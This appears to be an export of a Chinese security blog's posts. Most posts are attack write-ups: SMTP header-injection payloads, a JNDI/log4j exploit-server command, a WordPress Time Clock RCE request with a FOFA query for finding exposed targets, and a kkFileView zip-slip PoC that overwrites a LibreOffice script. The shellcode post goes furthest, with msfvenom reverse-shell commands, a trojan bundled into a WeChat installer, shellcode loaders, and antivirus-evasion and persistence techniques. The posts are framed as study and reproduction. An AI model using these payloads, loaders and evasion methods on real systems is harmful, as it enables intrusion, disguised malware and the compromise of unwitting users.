部分，检查是否有任何安全问题报告。</li></ul></li><li><p><strong>安全扫描工具</strong>：<br>使用网站安全扫描工具来自动检测潜在的安全问题。这些工具通常会检查是否有已知的恶意代码、暗链和其他安全漏洞。以下是一些推荐的工具：</p><ul><li><strong>Sucuri SiteCheck</strong>：一个免费的在线工具，可以扫描你的网站是否有恶意软件、黑名单状态、网站错误和过期软件。</li><li><strong>Quttera</strong>：提供网站恶意软件扫描和黑名单检测服务。</li><li><strong>Google Safe Browsing</strong>：通过 Google 提供的 API 或工具，检查网站是否被列入黑名单。</li></ul></li><li><p><strong>日志和文件检查</strong>：</p><ul><li><strong>服务器日志检查</strong>：检查服务器日志，查看是否有异常的请求或访问模式，这可能是发现暗链的线索。</li><li><strong>文件完整性检查</strong>：使用文件完整性监控工具，检查网站文件是否有未授权的更改。</li></ul></li></ol><h3 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a>手动检查</h3><ol><li><p><strong>查看网站源代码</strong>：</p><ul><li>手动查看页面的 HTML 源代码，查找是否有可疑的外部链接或嵌入的内容。</li><li>使用浏览器开发者工具（如 Chrome DevTools），检查页面中是否有隐藏的链接或内容。</li></ul></li><li><p><strong>检查站点地图和机器人文件</strong>：</p><ul><li>检查 <code>sitemap.xml</code> 和 <code>robots.txt</code> 文件，确保没有可疑的页面或目录被列出或允许搜索引擎爬取。</li></ul></li></ol><h3 id="实施安全措施"><a href="#实施安全措施" class="headerlink" title="实施安全措施"></a>实施安全措施</h3><p>为了预防和及时发现此类安全问题，建议你：</p><ol><li><strong>定期更新</strong>：确保所有网站软件、插件和主题保持最新，修补已知的安全漏洞。</li><li><strong>强密码</strong>：使用强密码，并定期更换，特别是对管理员账户。</li><li><strong>安全插件</strong>：安装安全插件（如 Wordfence、Sucuri Security）来监控和保护网站。</li><li><strong>备份</strong>：定期备份网站数据，以便在发生安全问题时能迅速恢复。</li></ol><p>通过以上方法，你可以有效地检测并处理主域名下的暗链问题，确保网站的安全性和信誉。</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>smtp注入</title>
    <link href="/2024/11/21/smtp%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/21/smtp%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>漏洞成因：还是因为输入内容没有被完整校验或过滤，从而达到非设计预期结果</p><h3 id="注入抄送内容"><a href="#注入抄送内容" class="headerlink" title="注入抄送内容"></a>注入抄送内容</h3><p>可通过添加&#x2F;控制邮件头的方式，篡改邮件的发送者、抄送、密送等字段，从而达到欺骗、窃取邮件信息或劫持邮件传递的目的。<br>常见邮件头内容</p><table><thead><tr><th>邮件头字段</th><th>含义</th></tr></thead><tbody><tr><td>From</td><td>邮件的发送者</td></tr><tr><td>To</td><td>邮件的主要接收者</td></tr><tr><td>Cc</td><td>邮件的抄送接收者</td></tr><tr><td>Bcc</td><td>邮件的密送接收者</td></tr><tr><td>Subject</td><td>邮件的主题或标题</td></tr><tr><td>Body</td><td>邮件的正文内容</td></tr><tr><td>Date</td><td>邮件的发送时间</td></tr><tr><td>Reply-To</td><td>回复邮件时使用的地址</td></tr><tr><td>Importance</td><td>邮件的重要性级别</td></tr><tr><td>MIME-Version</td><td>邮件的MIME版本</td></tr><tr><td>Content-Type</td><td>邮件正文内容的类型及编码方式</td></tr><tr><td>Content-Disposition</td><td>邮件附件的处理方式</td></tr><tr><td>Message-ID</td><td>邮件的唯一标识符</td></tr><tr><td>In-Reply-To</td><td>针对哪封邮件进行回复的标识符</td></tr><tr><td>References</td><td>相关邮件的标识符列表</td></tr><tr><td>Return-Path</td><td>邮件的退回地址</td></tr><tr><td>X-Priority</td><td>邮件的优先级</td></tr><tr><td>若<code>to_addr</code>为收件人可控，我们将其输入为<code>ntoouuzovrlfy@baybabes.com%0aCc: rocaced977@soremap.com</code>并发送</td><td></td></tr></tbody></table><ul><li>%0a：换行</li></ul><h4 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">rec@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com admin@domain.com%0AFrom:<span class="hljs-keyword">eval</span>@domain.com From:sender@domain.com%0ATo:attacker@domain.com From:sender@domain.com%0ASubject:This’s%20Fake%20Subject<br></code></pre></td></tr></table></figure><h4 id="规避"><a href="#规避" class="headerlink" title="规避"></a>规避</h4><ul><li>输入过滤，可以使用正则表达式<code>^[\w\.-]+@[\w\.-]+\.\w+$</code>来过滤用用户提交的邮箱。</li><li>使用安全的组件和库，如Python的<code>smtplib</code>、Java的<code>javax.mail</code>、PHP的<code>PHPMailer</code>等，尽可能的通过模块内置的一些函数来设定SMTP header头。</li></ul><p>参考链接：<a href="https://juejin.cn/post/7241504677911838778">https://juejin.cn/post/7241504677911838778</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jndi注入</title>
    <link href="/2024/11/21/jndi%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/21/jndi%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>(Java Naming and Directory Interface) 是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。</strong></p><h4 id="主要支持的服务"><a href="#主要支持的服务" class="headerlink" title="主要支持的服务"></a>主要支持的服务</h4><ul><li><strong>RMI（java远程方法调用）</strong></li><li><strong>LDAP(轻量级目录访问协议)</strong></li><li>CORBA（公共对象请求代理体系结构）</li><li>DNS（域名服务）</li></ul><p><strong>JNDI中有两个方法：</strong></p><ul><li>bind() :作用是将名称绑定到对象里面</li><li>lookup() :作用是通过名字检索执行的对象</li></ul><p>JNDI注入简单来说就是在JNDI接口在初始化时，如果lookup()方法的参数可控，攻击者就可以将恶意的url传入参数加载恶意的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<span class="hljs-comment">//得到初始目录环境的一个引用</span><br>        initialContext.lookup(uri);<span class="hljs-comment">//获取指定的远程对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h3><h4 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h4><h4 id="log4j-反序列化-rmi-ldap"><a href="#log4j-反序列化-rmi-ldap" class="headerlink" title="log4j 反序列化 rmi&#x2F;ldap"></a>log4j 反序列化 rmi&#x2F;ldap</h4><p>lookup（url）方法的参数可以由用户操控–》 ldap:&#x2F;&#x2F;IP&#x2F;exploit(一个类)</p><ul><li>启动rmi服务端（工具：mash）漏洞端可以访问到该服务端，返回一个http地址（包含服务端2中的ref对象）</li><li>服务端2，返回ref对象。（有攻击payload，那个exploit类）</li></ul><p>漏洞端执行了ref对象（whoami）</p><p>log4jpayload 用DNS服务情况下，可以探测漏洞是否存在，不暴露自己服务器地址，开销小速度快</p><p>代码审计：找lookup的参数，是否用户可控</p><p>工具：JNDIExploit，本地启动ldap&#x2F;rmi服务 本地又启动一个http，放置恶意类</p><p><code>java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps_ip -l 1389-p 8090</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShellCode和免杀入门</title>
    <link href="/2024/11/21/shellcode/"/>
    <url>/2024/11/21/shellcode/</url>
    
    <content type="html"><![CDATA[<h4 id="何为shellcode"><a href="#何为shellcode" class="headerlink" title="何为shellcode"></a>何为shellcode</h4><p><strong>Shellcode</strong>是一种以机器代码形式存在的小段指令，通常用于在目标系统中执行特定操作，最初主要是用来在系统上获取一个“shell”访问权限（即控制终端）。其广泛用于渗透测试和漏洞利用，也用于在应用程序或操作系统中触发特定的操作。</p><h5 id="shellcode奏效流程"><a href="#shellcode奏效流程" class="headerlink" title="shellcode奏效流程"></a>shellcode奏效流程</h5><p>常shellcode确实需要嵌入或打包在一个可执行程序中才能运行。Shellcode本质上是一段机器指令，而操作系统不会直接运行二进制数据；它需要一个载体程序来将其加载到内存中，并赋予它相应的权限。<br><strong>一般情况下，shellcode的执行流程如下</strong>：</p><ol><li><strong>载体程序</strong>：创建一个可执行程序（通常是C&#x2F;C++编写的程序），使用系统调用（如VirtualAlloc、mprotect等）来分配可执行的内存空间。</li><li><strong>加载shellcode</strong>：将shellcode复制到分配好的内存地址。</li><li><strong>执行shellcode</strong>：通过函数指针或类似方法调用此内存地址，以便执行其中的指令。</li></ol><h5 id="shellcode生成"><a href="#shellcode生成" class="headerlink" title="shellcode生成"></a>shellcode生成</h5><ul><li>msf 生成shellcode –产生一段shellcode在c文件中</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows <span class="hljs-attribute">LHOST</span>=10.10.20.67 <span class="hljs-attribute">LPORT</span>=8888 -e x86/shikata_ga_nai -i 15 -b <span class="hljs-string">&#x27;\x00\&#x27;</span> <span class="hljs-attribute">PrependMigrate</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">PrependMigrateProc</span>=svchost.exe -f c &gt; shellcode.c<br></code></pre></td></tr></table></figure><p><img src="/images/shellcode/shell1.png" alt="长这样"></p><ul><li>msf 生成执行木马 —- 相当于已经打包好</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff">msfvenom -l encoders<br><br>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9999 -e x86/shikata_ga_nai -x WeChatSetup.exe -i 12 -f exe -o /root/WeChatSetup1.exe<br><br><span class="hljs-deletion">-e /指定编码方式对攻击载荷进行重新编码</span><br><br><span class="hljs-deletion">-x /指定木马捆绑在哪个可执行程序模板上</span><br><br><span class="hljs-deletion">-i /指定对目标进行编码的次数，多次编码理论上有助于免杀的实现</span><br><br><span class="hljs-deletion">-f /指定msf编码器输出程序的格式</span><br><br><span class="hljs-deletion">-0 /指定处理完毕后的文件输出路径</span><br></code></pre></td></tr></table></figure><h4 id="shellcode打包"><a href="#shellcode打包" class="headerlink" title="shellcode打包"></a>shellcode打包</h4><h5 id="C打包"><a href="#C打包" class="headerlink" title="C打包"></a>C打包</h5><ul><li>打包器–c lang 编译生成可执行文件</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[]= 这里填shellcode;<br><br><span class="hljs-type">void</span> main()&#123;<br><br>     LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br>     memcpy(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    ((<span class="hljs-type">void</span>(*)())Memory)();<br><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="python打包"><a href="#python打包" class="headerlink" title="python打包"></a>python打包</h5><ul><li>python处理shellcode    主要使用ctypes库实现<br>1、申请内存  2、写入shellcode   3、运行shellcode</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">ctypes库是Python中用来调用系统动态链接库函数的模块，利用ctypes库可以调用C语言的动态链接库并向其传递函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> ctypes<br><br>shellcode = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位</span><br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br><br><span class="hljs-comment"># 申请内存，调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存</span><br>ptr = ctypes.windll.kernel32.VirtualAlloc(<br>    ctypes.c_int(<span class="hljs-number">0</span>),  <span class="hljs-comment"># 指向要分配的区域的起始地址的指针，值为null时指向系统保留其认为合适的区域</span><br>    ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)),  <span class="hljs-comment"># 分配区域的大小</span><br>    ctypes.c_int(<span class="hljs-number">0x3000</span>),  <span class="hljs-comment"># 内存分配的类型</span><br>    ctypes.c_int(<span class="hljs-number">0x40</span>),  <span class="hljs-comment"># 要分配的页区域的内存保护，可读可写可执行</span><br>)<br><br><span class="hljs-comment"># 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中</span><br>buffer = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>    ctypes.c_uint64(ptr),  <span class="hljs-comment"># 指向要将字节复制到的目标内存块的指针</span><br>    buffer,  <span class="hljs-comment"># 指向要从中复制字节的源内存块的指针</span><br>    ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode))  <span class="hljs-comment"># 从源复制到目标的字节数</span><br>)<br><br><span class="hljs-comment"># 创建一个线程从shellcode放置位置首地址开始执行</span><br>handle = ctypes.windll.kernel32.CreateThread(<br>    ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)),  <span class="hljs-comment"># 指向SECURITY_ATTRIBUTES结构的指针，线程安全属性</span><br>    ctypes.c_int(<span class="hljs-number">0</span>),  <span class="hljs-comment"># 堆栈的初始大小</span><br>    ctypes.c_void_p(ptr),  <span class="hljs-comment"># 指向由线程执行的应用程序定义函数的指针</span><br>    ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)),  <span class="hljs-comment"># 指向要传递给线程的变量的指针</span><br>    ctypes.c_int(<span class="hljs-number">0</span>),  <span class="hljs-comment"># 控制线程创建的标志，为0表示创建后，线程会立即运行</span><br>    ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>))  <span class="hljs-comment"># 指向接收线程标识符的变量的指针，如果此参数为NULL，则不返回线程标识符</span><br>)<br><br><span class="hljs-comment"># 等待创建线程运行完成</span><br>ctypes.windll.kernel32.WaitForSingleObject(<br>    ctypes.c_int(handle),  <span class="hljs-comment"># 对象的句柄</span><br>    ctypes.c_int(-<span class="hljs-number">1</span>)  <span class="hljs-comment"># 超时间隔，以毫秒为单位，将其设为负数，等待时间将成为无限等待，程序就不会结束</span><br>)<br></code></pre></td></tr></table></figure><h5 id="python—-可执行文件"><a href="#python—-可执行文件" class="headerlink" title="python—&gt;可执行文件"></a>python—&gt;可执行文件</h5><p><code>nuitka --standalone --onefile --windows-disable-console xx.py</code></p><p><code>pyinstaller --onefile --noconsole your_script.py</code>  （py-》exe）</p><h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><p>所谓免杀，即躲过系统安全软件的各种检测，顺利执行。</p><h5 id="常见查杀机制"><a href="#常见查杀机制" class="headerlink" title="常见查杀机制"></a>常见查杀机制</h5><ul><li>静态查杀:杀毒软件公司从各种途径获取到的病毒样本，在人工检查确认是病毒后，就开始提取这个病毒文件的特征码，所谓的特征码就是可以唯一标识这个文件的数据，例如最简单可以使用文件MD5值hash、文件名、函数名、敏感字符串、敏感api等等</li><li>动态查杀: 检测内存和hook api，通过模拟计算机的环境执行目标文件再观察特征行为。监测点:系统服务、注册表、组策略、防火墙、敏感程序、各种API(监控进程调用的api不止是api名称，还包括api的调用顺序、调用源、参数等等。)、文件夹。</li></ul><h5 id="如何免杀"><a href="#如何免杀" class="headerlink" title="如何免杀"></a>如何免杀</h5><ol><li><strong>代码混淆与加密环节</strong><ul><li><strong>加密算法运用</strong>：对木马的核心代码（如控制指令部分、数据窃取模块等）使用高级加密标准（AES）、RSA 等加密算法进行加密。这样，在木马程序传输和存储阶段，反病毒软件很难直接解析出其中的恶意内容。例如，当木马程序在被扫描时，反病毒软件看到的只是一堆经过加密的乱码，只有木马程序在内存中运行时，通过内置的解密模块解密后才能执行真正的恶意操作。</li><li><strong>代码混淆技术</strong>：采用代码混淆工具和技术，改变代码的结构和逻辑顺序。这包括重命名变量、函数，打乱代码块的顺序，插入无用代码（如大量的<code>NOP</code>指令，即空操作指令）等。例如，将一个简单的用于文件窃取的函数中的变量名从有意义的名称（如<code>file_path</code>）改为无意义的随机字符（如<code>a1b2c3</code>），并且在函数体中随机插入一些不影响功能的<code>NOP</code>指令，使得反病毒软件难以通过特征码匹配来识别。</li></ul></li><li><strong>加载方式创新环节</strong><ul><li><strong>利用合法程序加载</strong>：通过将木马程序注入到合法的系统进程或应用程序中，借助合法程序的加载机制来躲避查杀。例如，利用 Windows 操作系统中的<code>DLL</code>（动态链接库）加载机制，将木马代码封装成一个恶意<code>DLL</code>文件，然后通过修改合法进程（如<code>explorer.exe</code>）的加载配置，使其加载这个恶意<code>DLL</code>。在反病毒软件看来，它只是检测到正常程序的加载行为，很难发现其中隐藏的木马。</li><li><strong>隐蔽启动项利用</strong>：修改系统的启动项设置，以一种隐蔽的方式启动木马。例如，在 Windows 系统的注册表<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>下添加一个伪装成系统关键组件的启动项，其指向木马程序。并且这个启动项的名称和路径可能会被精心设计，使其看起来像是正常的系统程序启动路径，如使用与系统组件相似的文件名，骗过反病毒软件的初始扫描。</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_timeclock_rce</title>
    <link href="/2024/11/20/wp-timeclock-rce/"/>
    <url>/2024/11/20/wp-timeclock-rce/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>WordPress 的 Time Clock 插件和 Time Clock Pro 插件在 1.2.2 及以下版本（适用于 Time Clock）和 1.1.4 版本（适用于 Time Clock Pro）中存在通过“etimeclockwp_load_function_callback”函数执行远程代码的漏洞。这允许未经身份验证的攻击者在服务器上执行代码。无法指定调用函数的参数。</p><p>1.2.2版本 链接： <a href="https://downloads.wordpress.org/plugin/time-clock.1.2.2.zip">https://downloads.wordpress.org/plugin/time-clock.1.2.2.zip</a></p><h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>fofa-query:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">body=&quot;/wp-content/plugins/time-clock/&quot; || body=&quot;/wp-content/plugins/time-clock-pro/&quot;<br></code></pre></td></tr></table></figure><p>includes&#x2F;admin&#x2F;ajax_functions_admin.php</p><p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>该函数的主要目的是接收一个名为 <code>&lt;/font&gt;&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;function&lt;/font&gt;``&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>的 POST 参数，对其进行清理后，检查是否存在对应的函数，如果存在则调用该函数并输出其结果，最后调用 <code>&lt;/font&gt;&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;wp_die()&lt;/font&gt;``&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>终止执行。<code>&lt;/font&gt;</code></p><p><code>call_user_func&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>是一个 PHP 内置函数，用于动态地调用一个函数。<code>&lt;/font&gt;</code></p><p>安全风险：</p><ul><li>直接从用户输入（POST 参数）中获取函数名并调用可能存在安全风险。恶意用户可能尝试传入恶意的函数名来执行未经授权的操作或导致安全漏洞。应该对用户输入进行更严格的验证和过滤，以确保只允许特定的、安全的函数被调用。</li></ul><p><img src="/images/wp-timeclock-rce/wp1.png" alt="代码"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/<span class="hljs-number">2</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">58</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3029</span>.<span class="hljs-number">110</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">16</span><br><br><span class="hljs-attribute">function</span>=phpinfo<br><br></code></pre></td></tr></table></figure><p><img src="/images/wp-timeclock-rce/wp2.png" alt="执行效果"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kkFileView_fileuplad_RCE</title>
    <link href="/2024/11/20/kkFileView-fileuplad-RCE/"/>
    <url>/2024/11/20/kkFileView-fileuplad-RCE/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><ul><li><p>漏洞成因<br>在v4.2.0版本的更新中，由于前台上传功能在处理压缩包时，从仅获取文件名改为获取文件名及其目录，导致出现了Zip Slip漏洞。这使得攻击者可上传包含恶意代码的压缩包并覆盖系统文件，随后通过调用这些被覆盖的文件实现远程代码执行。</p></li><li><p>已知影响版本：4.2.0 &lt;&#x3D; kkFileView &lt;&#x3D; v4.4.0-beta</p></li><li><p>临时解决方案</p><ol><li>建议开启 file.upload.disable&#x3D;true 参数，禁用首页的文件上传功能，关闭演示入口来规避问题。</li><li>如非必要，不要将该系统放置在公网上。或通过网络ACL策略限制访问来源，例如只允许来自特定IP地址或地址段的访问请求。<br>该问题已在项目的开发分支中得到修复，但尚未在官方发布版本中更新。用户可以通过从官方GitHub页面下载开发分支的最新代码来临时解决此问题，等待修复被包含在即将发布的正式版本中。建议持续关注官方的版本更新通知，以便及时获得修复。</li></ol></li></ul><h4 id="攻击-检测方法"><a href="#攻击-检测方法" class="headerlink" title="攻击||检测方法"></a>攻击||检测方法</h4><h5 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h5><p>覆盖相应的py脚本<br>制作恶意的跨目录zip上传，内置大黑客们自己的py脚本，覆盖原本的uno.py文件（<em>使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件</em>）。</p><p>制作方式参考[[【漏洞知识】跨目录zip构造]]</p><h5 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h5><p>再随便上传一个odt文件，另其发起libreoffice任务 上传并预览</p><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">import zipfile<br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-symbol">    try:</span><br>        <span class="hljs-keyword">binary1 </span>= <span class="hljs-keyword">b&#x27;XXX&#x27;</span><br><span class="hljs-keyword"></span>        <span class="hljs-keyword">binary2 </span>= <span class="hljs-keyword">b&#x27;import </span>os\r\nos.system(\<span class="hljs-string">&#x27;touch /tmp/hack_by_XXX\&#x27;)&#x27;</span><br>        zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;hack.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>        info = zipfile.ZipInfo(<span class="hljs-string">&quot;hack.zip&quot;</span>)<br>        zipFile.writestr(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-keyword">binary1)</span><br><span class="hljs-keyword"></span>        zipFile.writestr(<span class="hljs-string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span>, <span class="hljs-keyword">binary2)</span><br><span class="hljs-keyword"></span>        zipFile.<span class="hljs-keyword">close()</span><br><span class="hljs-keyword"></span>    except IOError as e:<br>        raise e<br></code></pre></td></tr></table></figure><p>代码中制作了一个跨目录zip，解压后会将内置的 touch文件 脚本覆盖到原有的uno.py文件<br>然后上传一个随便写了点啥啥的odt文件，然后点击<strong>预览</strong></p><ul><li>参考链接<br><a href="https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC">https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>le0&#39;s First Post</title>
    <link href="/2024/11/20/leo-s-First-Post/"/>
    <url>/2024/11/20/leo-s-First-Post/</url>
    
    <content type="html"><![CDATA[<p>人生有三种根本的困境。<br>第一，人生来只能注定是自己，人生来注定是活在无数他人中间，并且无法与他人彻底沟通。这意味着孤独。<br>第二，人生来就有欲望，人实现欲望的能力，永远赶不上他欲望的能力。这是一个永恒的距离。<br>第三，人生来不想死，可人生来就是在走向死。这意味着恐惧。</p><p>————史铁生《命若琴弦》</p>]]></content>
    
    
    
    <tags>
      
      <tag>随便写写</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
